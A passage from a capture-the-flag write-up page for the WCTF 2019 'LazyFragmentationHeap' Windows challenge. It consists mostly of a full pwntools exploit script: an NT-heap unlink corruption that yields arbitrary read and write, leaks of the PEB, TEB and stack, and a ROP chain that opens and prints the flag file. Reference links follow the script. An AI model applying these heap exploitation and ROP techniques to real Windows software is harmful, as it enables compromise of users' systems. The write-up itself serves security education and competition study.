    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

    <span class="n">for_leak</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">for_leak</span> <span class="o">+=</span> <span class="n">fake_HEAP_USERDATA_HEADER</span>
    <span class="n">for_leak</span> <span class="o">+=</span> <span class="n">fake_FILE</span> <span class="o">*</span> <span class="p">((</span><span class="mh">0x1000</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">for_leak</span><span class="p">))</span> <span class="o">/</span> <span class="nb">len</span><span class="p">(</span><span class="n">fake_FILE</span><span class="p">))</span>

    <span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">for_leak</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>
    <span class="n">read_file</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>

    <span class="c1"># ucrtbase!_pioinfo[0] has fixed heap offset
</span>    <span class="n">hi</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x8d48</span><span class="p">))</span> <span class="c1"># I dunno any details about windows FSOP...V_V
</span>    <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>   <span class="c1"># But @scwuaptx said offset 0x38 is flag
</span>    <span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">9</span><span class="p">),</span> <span class="bp">False</span><span class="p">)</span>          <span class="c1"># this will switch text mode to binary mode
</span>
    <span class="n">fxxk</span> <span class="o">=</span> <span class="mh">0xbeefdad0000</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0x28</span> <span class="o">*</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x20</span> <span class="c1"># heap_mem of chunk 6 
</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">(</span><span class="mh">0x520</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="c1"># sizeof(chunk 5 and 6) + sizeof(_HEAP_ENTRY)
</span>                               <span class="c1"># have same heap_mem with chunk 5
</span>    <span class="n">free</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>                    <span class="c1"># Actually it free'ing chunk 7
</span>    <span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x520</span><span class="p">)</span>            <span class="c1"># Now, chunk 7 === chunk 5
</span>
    <span class="c1"># But chunk 7 is bigger than chunk 5
</span>    <span class="n">edit</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x520</span> <span class="o">+</span> 
            <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> 
            <span class="n">p64</span><span class="p">(</span><span class="mh">0x5353000053</span> <span class="o">^</span> <span class="n">heap_encod</span><span class="p">)</span> <span class="o">+</span> 
            <span class="n">p64</span><span class="p">(</span><span class="n">fxxk</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="c1"># Flink-&gt;Blink = Flink
</span>            <span class="n">p64</span><span class="p">(</span><span class="n">fxxk</span><span class="p">)</span>       <span class="c1"># Blink-&gt;Flink = Blink
</span>                            <span class="c1"># satisfying unlink condition
</span>                            <span class="c1"># *(fxxk) = fxxk
</span>    <span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x520</span><span class="p">)</span>
    
    <span class="n">lazy_id1</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span> 
    <span class="n">lazy_id2</span> <span class="o">=</span> <span class="mh">0xcafebabe</span>
    <span class="n">lazy_id3</span> <span class="o">=</span> <span class="mh">0x13371337</span>
    <span class="n">create_lazy_header</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">chunk_id</span> <span class="p">:</span> <span class="n">flat</span><span class="p">([</span>
                                               <span class="mh">0xddaabeef1acd</span><span class="p">,</span> 
                                               <span class="mh">0x200</span><span class="p">,</span>
                                               <span class="n">chunk_id</span><span class="p">,</span>
                                               <span class="mh">0xddaabeef1acd</span><span class="p">,</span> 
                                           <span class="p">],</span> <span class="n">word_size</span><span class="o">=</span><span class="mi">64</span><span class="p">,</span> <span class="n">endianness</span><span class="o">=</span><span class="s">"little"</span><span class="p">)</span>

    <span class="n">lazy_header1</span> <span class="o">=</span> <span class="n">create_lazy_header</span><span class="p">(</span><span class="n">lazy_id1</span><span class="p">)</span>
    <span class="n">lazy_header2</span> <span class="o">=</span> <span class="n">create_lazy_header</span><span class="p">(</span><span class="n">lazy_id2</span><span class="p">)</span>
    <span class="n">lazy_header3</span> <span class="o">=</span> <span class="n">create_lazy_header</span><span class="p">(</span><span class="n">lazy_id3</span><span class="p">)</span>

    <span class="n">edit</span><span class="p">(</span><span class="mh">0x5353000053</span> <span class="o">^</span> <span class="n">heap_encod</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xbeefdad0000</span><span class="p">)</span> <span class="o">+</span> 
                                    <span class="n">lazy_header1</span> <span class="o">+</span> 
                                    <span class="n">p64</span><span class="p">(</span><span class="mh">0xbeefdad0000</span><span class="p">)</span>
    <span class="p">)</span>

    <span class="c1"># set lazy_header1 at 0xbeefdad0000
</span>    <span class="n">edit</span><span class="p">(</span><span class="n">lazy_id1</span><span class="p">,</span> <span class="n">lazy_header1</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xbeefdad0000</span><span class="p">))</span> 

    <span class="c1"># Becuase of edit limit at "2. Edit File content",
</span>    <span class="c1"># HAVE TO keep modifying magic1
</span>    <span class="k">def</span> <span class="nf">lazy_read</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
        <span class="k">global</span> <span class="n">magic_switch</span>

        <span class="k">if</span> <span class="n">magic_switch</span><span class="p">:</span>
            <span class="n">edit</span><span class="p">(</span><span class="n">lazy_id1</span><span class="p">,</span> <span class="n">lazy_header1</span> <span class="o">+</span> 
                           <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span>
                           <span class="n">lazy_header2</span> <span class="o">+</span>
                           <span class="n">p64</span><span class="p">(</span><span class="mh">0xbeefdad0000</span><span class="p">)</span>
            <span class="p">)</span>
            <span class="n">result</span> <span class="o">=</span> <span class="n">show</span><span class="p">(</span><span class="n">lazy_id1</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">edit</span><span class="p">(</span><span class="n">lazy_id2</span><span class="p">,</span> <span class="n">lazy_header1</span> <span class="o">+</span> 
                           <span class="n">p64</span><span class="p">(</span><span class="mh">0xbeefdad0000</span><span class="p">)</span> <span class="o">+</span>
                           <span class="n">lazy_header2</span> <span class="o">+</span>
                           <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
            <span class="p">)</span>
            <span class="n">result</span> <span class="o">=</span> <span class="n">show</span><span class="p">(</span><span class="n">lazy_id2</span><span class="p">)</span>

        <span class="n">magic_switch</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">magic_switch</span>
        <span class="k">return</span> <span class="n">result</span>

    <span class="k">def</span> <span class="nf">lazy_write</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
        <span class="k">global</span> <span class="n">magic_switch</span>

        <span class="k">if</span> <span class="n">magic_switch</span><span class="p">:</span>
            <span class="n">edit</span><span class="p">(</span><span class="n">lazy_id1</span><span class="p">,</span> <span class="n">lazy_header1</span> <span class="o">+</span> 
                           <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span>
                           <span class="n">lazy_header2</span> <span class="o">+</span>
                           <span class="n">p64</span><span class="p">(</span><span class="mh">0xbeefdad0000</span><span class="p">)</span> <span class="o">+</span>
                           <span class="n">lazy_header3</span> <span class="o">+</span>
                           <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
            <span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">edit</span><span class="p">(</span><span class="n">lazy_id2</span><span class="p">,</span> <span class="n">lazy_header1</span> <span class="o">+</span> 
                           <span class="n">p64</span><span class="p">(</span><span class="mh">0xbeefdad0000</span><span class="p">)</span> <span class="o">+</span>
                           <span class="n">lazy_header2</span> <span class="o">+</span>
                           <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span>
                           <span class="n">lazy_header3</span> <span class="o">+</span>
                           <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
            <span class="p">)</span>

        <span class="n">edit</span><span class="p">(</span><span class="n">lazy_id3</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>
        <span class="n">magic_switch</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">magic_switch</span>

    <span class="c1"># ntdll!TlsBitMap+0x8 == _PEB-&gt;TlsBitmap
</span>    <span class="n">_PEB</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">lazy_read</span><span class="p">(</span><span class="n">ntdll</span><span class="o">+</span><span class="mh">0x165348</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span> <span class="o">-</span> <span class="mh">0x80</span> 
    <span class="n">_TEB</span> <span class="o">=</span> <span class="n">_PEB</span> <span class="o">+</span> <span class="mh">0x1000</span> 

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"&amp;_PEB = 0x%016x"</span> <span class="o">%</span> <span class="n">_PEB</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"&amp;_TEB = 0x%016x"</span> <span class="o">%</span> <span class="n">_TEB</span><span class="p">)</span>

    <span class="c1"># leak _TEB-&gt;NtTib-&gt;StackBase
</span>    <span class="n">stack_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">lazy_read</span><span class="p">(</span><span class="n">_TEB</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">2</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"_TEB-&gt;NtTib-&gt;StackBase = 0x%016x"</span> <span class="o">%</span> <span class="n">stack_base</span><span class="p">)</span>
   
    <span class="c1"># find return address of main() at beginning
</span>    <span class="n">main_ret</span> <span class="o">=</span> <span class="n">lazy_base</span> <span class="o">+</span> <span class="mh">0x1b78</span>

    <span class="n">find_ret_addr</span> <span class="o">=</span> <span class="n">hi</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"finding return address on stack"</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">offset</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
        <span class="n">stack_addr</span> <span class="o">=</span> <span class="n">stack_base</span> <span class="o">-</span> <span class="n">offset</span>
        <span class="n">stack_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">lazy_read</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span>

        <span class="k">if</span> <span class="n">stack_leak</span> <span class="o">==</span> <span class="n">main_ret</span><span class="p">:</span>
            <span class="n">find_ret_addr</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"gotcha!"</span><span class="p">)</span>
            <span class="k">break</span>

    <span class="c1"># return addres of read() at lazyfragmentationheap+0x14bb
</span>    <span class="n">stack_addr</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="mh">0x80</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"stack addr = 0x%016x"</span> <span class="o">%</span> <span class="n">stack_addr</span><span class="p">)</span>

    <span class="n">flag_addr</span> <span class="o">=</span> <span class="n">lazy_base</span> <span class="o">+</span> <span class="mh">0x50c0</span>
    <span class="n">flag_buf</span> <span class="o">=</span> <span class="n">lazy_base</span> <span class="o">+</span> <span class="mh">0x50d0</span>
    <span class="n">lazy_write</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">,</span> <span class="s">"flag.txt</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>

    <span class="c1"># restore Heap for WINAPI internal usage
</span>    <span class="n">HeapCreate_addr</span>   <span class="o">=</span> <span class="n">kernel32</span> <span class="o">+</span> <span class="mh">0x1e500</span> <span class="c1"># IAT to KERNELBASE!HeapCreate
</span>
    <span class="c1"># https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/crt-alphabetical-function-reference
</span>    <span class="c1"># ucrtbase.dll contains POSIX functions like open(), read(), write()...
</span>    <span class="n">open_addr</span>  <span class="o">=</span> <span class="n">ucrtbase</span> <span class="o">+</span> <span class="mh">0xa1ae0</span>
    <span class="n">read_addr</span>  <span class="o">=</span> <span class="n">ucrtbase</span> <span class="o">+</span> <span class="mh">0x16140</span>
    <span class="n">write_addr</span> <span class="o">=</span> <span class="n">ucrtbase</span> <span class="o">+</span> <span class="mh">0x14b30</span>
    <span class="n">exit_addr</span>  <span class="o">=</span> <span class="n">ucrtbase</span> <span class="o">+</span> <span class="mh">0x1b8c0</span>

    <span class="n">pop_rcx_ret</span> <span class="o">=</span> <span class="n">ntdll</span> <span class="o">+</span> <span class="mh">0x21527</span>
    <span class="n">pop_rdx_ret</span> <span class="o">=</span> <span class="n">ucrtbase</span> <span class="o">+</span> <span class="mh">0xa9eb2</span>
    <span class="n">pop_r8_ret</span>  <span class="o">=</span> <span class="n">ntdll</span> <span class="o">+</span> <span class="mh">0x4d6cf</span>
    <span class="n">store_rdx_rax_ret</span> <span class="o">=</span> <span class="n">ntdll</span> <span class="o">+</span> <span class="mh">0x88f5c</span>
    <span class="n">store_rcx_plus8_rax_ret</span> <span class="o">=</span> <span class="n">ucrtbase</span> <span class="o">+</span> <span class="mh">0x4a721</span>
    <span class="n">add_rsp_0x28_ret</span> <span class="o">=</span> <span class="n">ntdll</span> <span class="o">+</span> <span class="mh">0x63c5</span>

    <span class="n">process_heap</span> <span class="o">=</span> <span class="n">_PEB</span> <span class="o">+</span> <span class="mh">0x30</span>    <span class="c1"># _PEB-&gt;ProcessHeap
</span>    <span class="n">crt_heap</span> <span class="o">=</span> <span class="n">ucrtbase</span> <span class="o">+</span> <span class="mh">0xeb570</span> <span class="c1"># ucrtbase!_acrt_heap
</span>
    <span class="n">rop_chain</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
        <span class="n">pop_rcx_ret</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="n">pop_rdx_ret</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="n">pop_r8_ret</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="n">HeapCreate_addr</span><span class="p">,</span>   <span class="c1"># rax = HeapCreate(0, 0, 0)
</span>
        <span class="n">pop_rdx_ret</span><span class="p">,</span> 
        <span class="n">process_heap</span><span class="p">,</span>
        <span class="n">store_rdx_rax_ret</span><span class="p">,</span> <span class="c1"># *process_heap = rax
</span>
        <span class="n">pop_rdx_ret</span><span class="p">,</span> 
        <span class="n">crt_heap</span><span class="p">,</span>
        <span class="n">store_rdx_rax_ret</span><span class="p">,</span> <span class="c1"># *crt_heap = rax
</span>
        <span class="c1"># rax = open("flag.txt", _O_RDONLY, _S_IREAD)
</span>        <span class="n">pop_rcx_ret</span><span class="p">,</span>
        <span class="n">flag_addr</span><span class="p">,</span>
        <span class="n">pop_rdx_ret</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="n">pop_r8_ret</span><span class="p">,</span>
        <span class="mh">0x100</span><span class="p">,</span>
        <span class="n">open_addr</span><span class="p">,</span>
        <span class="n">add_rsp_0x28_ret</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>

        <span class="c1"># read(rax, flag_buf, 0x80)
</span>        <span class="n">pop_rcx_ret</span><span class="p">,</span>
        <span class="n">stack_addr</span> <span class="o">+</span> <span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="mi">29</span><span class="p">),</span>
        <span class="n">store_rcx_plus8_rax_ret</span><span class="p">,</span>
        <span class="n">pop_rcx_ret</span><span class="p">,</span>
        <span class="mh">0x12345678</span><span class="p">,</span> <span class="c1"># will replace to fd
</span>        <span class="n">pop_rdx_ret</span><span class="p">,</span> 
        <span class="n">flag_buf</span><span class="p">,</span>
        <span class="n">pop_r8_ret</span><span class="p">,</span>
        <span class="mh">0x80</span><span class="p">,</span>
        <span class="n">read_addr</span><span class="p">,</span>
        <span class="n">add_rsp_0x28_ret</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>

        <span class="c1"># write(1, flag_buf, 0x80)
</span>        <span class="n">pop_rcx_ret</span><span class="p">,</span>
        <span class="mi">1</span><span class="p">,</span>
        <span class="n">pop_rdx_ret</span><span class="p">,</span>
        <span class="n">flag_buf</span><span class="p">,</span>
        <span class="n">pop_r8_ret</span><span class="p">,</span>
        <span class="mh">0x80</span><span class="p">,</span>
        <span class="n">write_addr</span><span class="p">,</span>
        <span class="n">add_rsp_0x28_ret</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>

        <span class="c1"># exit(0)
</span>        <span class="n">pop_rcx_ret</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="n">exit_addr</span>
    <span class="p">],</span> <span class="n">word_size</span><span class="o">=</span><span class="mi">64</span><span class="p">,</span> <span class="n">endianness</span><span class="o">=</span><span class="s">"little"</span><span class="p">)</span>

    <span class="n">lazy_write</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">,</span> <span class="n">rop_chain</span><span class="p">)</span>
    <span class="n">hi</span><span class="p">.</span><span class="n">interactive</span><span class="p">(</span><span class="n">prompt</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>


<span class="c1"># I DON'T WANT TO SEE FXXKING ERROR
</span><span class="n">is_leaked</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"This is gonna takes some time..."</span><span class="p">)</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">lazy_base</span> <span class="o">=</span> <span class="n">persistent_leak</span><span class="p">(</span><span class="n">leakLazy</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
        <span class="n">kernel32</span> <span class="o">=</span> <span class="n">persistent_leak</span><span class="p">(</span><span class="n">lazy_base</span><span class="o">+</span><span class="mh">0x3008</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1e690</span>  <span class="c1"># KERNEL32!IsDebuggerPresentStub
</span>        <span class="n">ntdll</span>    <span class="o">=</span> <span class="n">persistent_leak</span><span class="p">(</span><span class="n">lazy_base</span><span class="o">+</span><span class="mh">0x3010</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x73810</span>  <span class="c1"># ntdll!RtlInitializeSListHead
</span>        <span class="n">ucrtbase</span> <span class="o">=</span> <span class="n">persistent_leak</span><span class="p">(</span><span class="n">lazy_base</span><span class="o">+</span><span class="mh">0x30b0</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x0f760</span>  <span class="c1"># ucrtbase!free
</span>        <span class="k">break</span>
    <span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
        <span class="k">continue</span>

<span class="n">is_leaked</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Done :D"</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LazyFragmentationHeap = 0x%016x"</span> <span class="o">%</span> <span class="n">lazy_base</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"kernel32 = 0x%016x"</span> <span class="o">%</span> <span class="n">kernel32</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ntdll    = 0x%016x"</span> <span class="o">%</span> <span class="n">ntdll</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ucrtbase = 0x%016x"</span> <span class="o">%</span> <span class="n">ucrtbase</span><span class="p">)</span>

<span class="n">exploit</span><span class="p">()</span>
</code></pre>
     </div>
    </div>
    <p><img src="[Writeup]%20LazyFragmentationHeap%20-%20WCTF%202019%20NULL@ROOT_files/lazyfragmentationheap-pic9.png" alt="flag result"></p>
    <h1 id="5-후기"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5. Review</font></font></h1>
    <p><img src="[Writeup]%20LazyFragmentationHeap%20-%20WCTF%202019%20NULL@ROOT_files/lazyfragmentationheap-pic10.jpg" alt="burnout"></p>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Burned it white...</font></font></p>
    <h1 id="6-참고자료"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6. Reference materials</font></font></h1>
    <p>Low-fragmentation Heap</p>
    <ul>
     <li>https://docs.microsoft.com/en-us/windows/win32/memory/low-fragmentation-heap</li>
    </ul>
    <p>Windows 8 Heap Internals</p>
    <ul>
     <li>http://illmatics.com/Windows%208%20Heap%20Internals.pdf</li>
     <li>http://illmatics.com/Windows%208%20Heap%20Internals%20(Slides).pdf</li>
    </ul>
    <p>Windows 10 Nt Heap Exploitation (English version)</p>
    <ul>
     <li>https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-english-version</li>
    </ul>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Heap information analysis using windbg and Win32 API</font></font></p>
    <ul>
     <li>https://www.sysnet.pe.kr/2/0/12068</li>
    </ul>
    <p>Low Fragmentation Heap (LFH) Exploitation - Windows 10 Userspace</p>
    <ul>
     <li>https://github.com/peleghd/Windows-10-Exploitation/blob/master/Low_Fragmentation_Heap_(LFH)_Exploitation_-_Windows_10_Userspace_by_Saar_Amar.pdf</li>
    </ul>
    <p>Understanding the Windows Allocator: A Redux</p>
    <ul>
     <li>https://www.leviathansecurity.com/blog/understanding-the-windows-allocator-a-redux</li>
    </ul>
    <p>Heap Overflow Exploitation on Windows 10 Explained</p>
    <ul>
     <li>https://blog.rapid7.com/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/</li>
    </ul>
    <p>Windows Debugging( Written in Chinese )</p>
    <ul>
     <li>https://github.com/thawk/wiki/wiki/windows_debug</li>
    </ul>
    <div class="blog-navigation"><a class="prev" href="https://null2root-github-io.translate.goog/blog/2020/01/11/BabyKernel-Dragon2019-writeup.html?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">« [Writeup] BabyKernel - Dragon CTF 2019</a> <a class="next" href="https://null2root-github-io.translate.goog/blog/2020/04/05/2020-null2root-recruit.html?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[Closed] 2020 Null@Root new group member recruitment »</font></font></a>
    </div>
    <div class="related">
    </div>
    <section class="author">
     <div class="toleft"><img class="selfie" src="[Writeup]%20LazyFragmentationHeap%20-%20WCTF%202019%20NULL@ROOT_files/y0ny0ns0n.png" alt="y0ny0ns0n">
     </div>
     <div class="toright">
      <h4 class="name">y0ny0ns0n</h4>
      <p class="bio">memory corruption bug in brain</p>
      <div class="share"><!-- Note: Only use three share links if your site width is set to large --> <!-- If site width is set to normal, you may choose any two share links --> <a class="twitter" href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://twitter.com/intent/tweet?text%3Dhttps://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html+-+%5BWriteup%5D+LazyFragmentationHeap+-+WCTF+2019+by+@y0ny0ns0n">
        <svg class="icon icon-twitter">
         <use xlink:href="#icon-twitter"></use>
        </svg><span class="icon-twitter">Tweet</span> </a> <a class="facebook" href="javascript:void(0)?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp" onclick="window.open('https://facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href), 'facebook-share-dialog', 'width=626,height=436'); return false;">
        <svg class="icon icon-facebook">
         <use xlink:href="#icon-facebook"></use>
        </svg><span class="icon-facebook-rect">Share</span> </a> <!-- <a class="google-plus" href="https://plus.google.com/share?url=https://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html" target="_blank"> <svg class="icon icon-google-plus"><use xlink:href="#icon-google-plus"></use></svg><span class="icon-google-plus">Share</span> </a> --> <!-- <a class="linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html&amp;title=[Writeup] LazyFragmentationHeap - WCTF 2019&amp;summary=&amp;source=https://null2root.github.io" target="_blank"> <svg class="icon icon-linkedin"><use xlink:href="#icon-linkedin"></use></svg><span class="icon-linkedin">Share</span> </a> --> <!-- <a class="reddit" href="https://reddit.com/submit?url=https://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html&amp;title=[Writeup] LazyFragmentationHeap - WCTF 2019" target="_blank"> <svg class="icon icon-reddit"><use xlink:href="#icon-reddit"></use></svg><span class="icon-reddit">Share</span> </a> -->
      </div>
     </div>
    </section>
    <section class="disqus">
     <iframe style="background-color: rgb(255, 255, 255) !important; border: 1px solid rgb(236, 147, 41) !important; min-width: 220px !important; min-height: 210px !important; max-height: 600px !important; pointer-events: all !important; z-index: 999 !important; width: 808px !important; --darkreader-inline-bgcolor: #181a1b; --darkreader-inline-border-top: #9e5c0e; --darkreader-inline-border-right: #9e5c0e; --darkreader-inline-border-bottom: #9e5c0e; --darkreader-inline-border-left: #9e5c0e;" srcdoc="&lt;html&gt;&lt;head&gt;&lt;style&gt;html, body {
  color: #303030 !important;
  height: 100% !important;
  overflow: hidden !important;
}
#btn-once-08921831319626496 {
  border: 2px solid #f06a0a !important;
  background-color: #f06a0a !important;
  color: #fefefe !important;
}
#btn-site-0930795770095174 {
  border: 2px solid #333 !important;
  background-color: #fefefe !important;
  color: #333 !important;
}
#btn-once-08921831319626496:hover {
  background-color: #fefefe !important;
  color: #333 !important;
}
#btn-site-0930795770095174:hover {
  background-color: #fefefe !important;
  border: 2px solid #f06a0a !important;
}
#ico-help-08688916912975184, #ico-close-06429364775386825 {
  position: absolute;
  right: 4px;
  top: 4px;
  line-height: 12px;
  text-align: center;
  text-decoration: none;
}
#ico-close-06429364775386825 {
  left: 4px;
  width: 20px;
}
#ico-help-08688916912975184:before, #ico-close-06429364775386825:before {
  border: 2px solid;
  border-radius: 50%;
  display: inline-block;
  color: #555;
  content: '?';
  font-size: 12px;
  font-weight: bold;
  padding: 1px;
  height: 1em;
  width: 1em;
}
#ico-close-06429364775386825:before {
  border: 0;
  content: '✕';
  padding: 4px;
}
#ico-help-08688916912975184:hover:before, #ico-close-06429364775386825:hover:before {
  color: #ec9329;
}
a {
  text-decoration: underline;
  color: black;
}
a:hover {
  color: #ec9329;
}
@media (prefers-color-scheme: dark) {
  :root {
    color-scheme: dark;
  }
  body {
    background-color: #333 !important;
    color: #ddd !important;
  }
  a, a:visited {
    color: #ddd !important;
  }
  a:hover {
    color: #f06a0a !important;
  }
  #ico-help-08688916912975184:before, #ico-close-06429364775386825:before {
    color: #aaa;
  }
  #btn-site-0930795770095174 {
    background-color: #333 !important;
    border: solid 2px #ddd !important;
    color: #ddd !important;
  }
  #btn-once-08921831319626496:hover, #btn-site-0930795770095174:hover {
    background-color: #333 !important;
    color: #ddd !important;
  }
